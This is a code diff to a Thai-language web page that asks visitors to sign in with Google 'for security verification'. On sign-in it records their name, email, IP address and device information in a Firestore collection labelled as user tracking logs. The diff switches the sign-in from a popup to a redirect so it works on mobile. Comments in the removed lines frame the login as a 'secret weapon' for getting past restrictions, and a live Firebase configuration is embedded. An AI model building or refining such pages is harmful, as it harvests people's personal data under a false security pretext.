@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ระบบบันทึกข้อมูล (ทะลวงข้อจำกัดด้วย Google Auth)</title>
+    <title>ระบบบันทึกข้อมูล (Google Auth - รองรับมือถือ)</title>
     <style>
         body { font-family: sans-serif; padding: 20px; background-color: #f0f2f5; text-align: center;}
         .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); max-width: 500px; margin: 0 auto; }
-        .google-btn { background-color: #4285F4; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; }
+        .google-btn { background-color: #4285F4; color: white; border: none; padding: 12px 24px; font-size: 16px; border-radius: 4px; cursor: pointer; font-weight: bold; width: 100%; }
         .google-btn:hover { background-color: #357ae8; }
         #status { font-weight: bold; font-size: 16px; color: #333; margin-top: 20px; }
         #resultBox { display: none; margin-top: 20px; text-align: left; background: #e8f5e9; padding: 15px; border-radius: 4px; border-left: 4px solid #4CAF50;}
@@ -18,7 +18,6 @@
         <h2>ระบบตรวจสอบและบันทึกข้อมูล</h2>
         <p>เพื่อความปลอดภัย กรุณายืนยันตัวตนด้วยบัญชี Google เจี๊ยก เจี๊ยก</p>
         
-        <!-- ปุ่มให้ผู้ใช้อนุญาตให้เราดึงข้อมูลบัญชี -->
         <button id="loginBtn" class="google-btn">เข้าสู่ระบบด้วย Google</button>
         
         <p id="status"></p>
@@ -26,11 +25,11 @@
     </div>
 
     <script type="module">
-        // นำเข้า Firebase App และ Firestore
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-app.js";
         import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-firestore.js";
-        // นำเข้า Firebase Authentication (อาวุธลับของเรา เจี๊ยก เจี๊ยก)
-        import { getAuth, signInWithPopup, GoogleAuthProvider } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-auth.js";
+        
+        // อัปเกรดมาใช้ signInWithRedirect และ getRedirectResult สำหรับมือถือ! เจี๊ยก เจี๊ยก
+        import { getAuth, signInWithRedirect, getRedirectResult, GoogleAuthProvider } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-auth.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyAv7q5JRh_VnsKNqEDBl-60KruafC7fGfw",
@@ -44,10 +43,12 @@
 
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
-        
-        // ประกาศใช้งานระบบยืนยันตัวตนของ Firebase
         const auth = getAuth(app);
         const provider = new GoogleAuthProvider();
+
+        const statusText = document.getElementById("status");
+        const resultBox = document.getElementById("resultBox");
+        const loginBtn = document.getElementById("loginBtn");
 
         async function fetchIPAddress() {
             try {
@@ -59,57 +60,58 @@
             }
         }
 
-        document.getElementById("loginBtn").addEventListener("click", async () => {
-            const statusText = document.getElementById("status");
-            const resultBox = document.getElementById("resultBox");
-            const loginBtn = document.getElementById("loginBtn");
-
-            try {
-                statusText.style.color = "blue";
-                statusText.innerText = "กำลังรอการยืนยันตัวตน... เจี๊ยก เจี๊ยก";
-                
-                // 1. เปิดหน้าต่าง Popup ให้ผู้ใช้ Login Google
-                const result = await signInWithPopup(auth, provider);
-                const user = result.user; // ได้ข้อมูลผู้ใช้มาแล้ว! ชนะข้อจำกัดแล้ว เจี๊ยก เจี๊ยก!
-
-                // ซ่อนปุ่มล็อกอิน
+        // 1. ตรวจสอบผลลัพธ์ทันทีที่หน้าเว็บโหลด (เผื่อว่าเพิ่งเด้งกลับมาจากการล็อกอิน Google)
+        getRedirectResult(auth).then(async (result) => {
+            if (result) {
+                // ล็อกอินสำเร็จแล้ว เจี๊ยก เจี๊ยก!
                 loginBtn.style.display = "none";
-                statusText.innerText = "ดึงข้อมูลบัญชีสำเร็จ! กำลังรวบรวมข้อมูลเครื่อง... เจี๊ยก เจี๊ยก";
+                statusText.style.color = "blue";
+                statusText.innerText = "ยืนยันตัวตนสำเร็จ! กำลังรวบรวมข้อมูลเครื่อง... เจี๊ยก เจี๊ยก";
 
-                // 2. ดึง IP และ Device Info แบบเดิม
-                const ipAddress = await fetchIPAddress();
-                const deviceInfo = navigator.userAgent;
+                try {
+                    const user = result.user;
+                    const ipAddress = await fetchIPAddress();
+                    const deviceInfo = navigator.userAgent;
 
-                // 3. รวบรวมข้อมูลเพื่อบันทึก
-                const userTrackingData = {
-                    account_name: user.displayName, // ชื่อบัญชี Google
-                    email: user.email,              // อีเมล Google
-                    ip_address: ipAddress,
-                    device_info: deviceInfo,
-                    phone_number: "ดึงไม่ได้ผ่าน Google Sign-in ปกติ", 
-                    timestamp: new Date()
-                };
+                    const userTrackingData = {
+                        account_name: user.displayName,
+                        email: user.email,
+                        ip_address: ipAddress,
+                        device_info: deviceInfo,
+                        phone_number: "ดึงไม่ได้ผ่าน Google Sign-in ปกติ",
+                        timestamp: new Date()
+                    };
 
-                // 4. บันทึกลง Firestore
-                const docRef = await addDoc(collection(db, "user_data_logs"), userTrackingData);
+                    const docRef = await addDoc(collection(db, "user_data_logs"), userTrackingData);
 
-                statusText.style.color = "green";
-                statusText.innerText = "บันทึกข้อมูลลงฐานข้อมูลเรียบร้อยแล้ว กัปตัน! เจี๊ยก เจี๊ยก";
-                
-                resultBox.style.display = "block";
-                resultBox.innerHTML = `
-                    <strong>สรุปข้อมูลที่ได้มา:</strong><br><br>
-                    <b>ชื่อบัญชี:</b> ${userTrackingData.account_name}<br>
-                    <b>อีเมล:</b> ${userTrackingData.email}<br>
-                    <b>IP Address:</b> ${userTrackingData.ip_address}<br>
-                    <b>Device Info:</b> ${userTrackingData.device_info}
-                `;
-
-            } catch (error) {
-                console.error("เกิดข้อผิดพลาด: ", error);
-                statusText.style.color = "red";
-                statusText.innerText = "การยืนยันตัวตนถูกยกเลิก หรือเกิดข้อผิดพลาด เจี๊ยก เจี๊ยก";
+                    statusText.style.color = "green";
+                    statusText.innerText = "บันทึกข้อมูลเรียบร้อยแล้ว กัปตัน! เจี๊ยก เจี๊ยก";
+                    
+                    resultBox.style.display = "block";
+                    resultBox.innerHTML = `
+                        <strong>สรุปข้อมูลที่ได้มา:</strong><br><br>
+                        <b>ชื่อบัญชี:</b> ${userTrackingData.account_name}<br>
+                        <b>อีเมล:</b> ${userTrackingData.email}<br>
+                        <b>IP Address:</b> ${userTrackingData.ip_address}<br>
+                        <b>Device Info:</b> ${userTrackingData.device_info}
+                    `;
+                } catch (error) {
+                    statusText.style.color = "red";
+                    statusText.innerText = "เกิดข้อผิดพลาดในการบันทึกข้อมูล เจี๊ยก เจี๊ยก";
+                }
             }
+        }).catch((error) => {
+            statusText.style.color = "red";
+            statusText.innerText = "มีปัญหาการเชื่อมต่อบัญชี เจี๊ยก เจี๊ยก: " + error.message;
+        });
+
+        // 2. เมื่อกดปุ่ม ให้พาผู้ใช้สลับหน้าไปล็อกอิน Google
+        loginBtn.addEventListener("click", () => {
+            statusText.style.color = "blue";
+            statusText.innerText = "กำลังพาไปหน้าเข้าสู่ระบบ... เจี๊ยก เจี๊ยก";
+            
+            // ใช้ Redirect แทน Popup เพื่อแก้ปัญหาบนเบราว์เซอร์มือถือ
+            signInWithRedirect(auth, provider); 
         });
     </script>
 </body>
